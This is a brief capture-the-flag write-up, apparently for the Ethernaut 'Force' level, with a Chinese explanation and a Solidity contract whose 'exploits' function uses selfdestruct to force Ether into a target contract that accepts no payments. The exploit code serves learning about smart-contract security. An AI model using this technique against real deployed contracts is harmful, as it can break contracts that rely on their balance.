
# Level07 Force
selfdestruct函数可以强行发送ETH, 可参考https://medium.com/@alexsherbuck/two-ways-to-force-ether-into-a-contract-1543c1311c56


```
pragma solidity ^0.4.24;

contract Force {
}

contract Force2 is Force{
    Force f;
    constructor(address _instance) public {
        f = Force(_instance);
    }
    
    function exploits() public payable{
        selfdestruct(f);
    }
}
```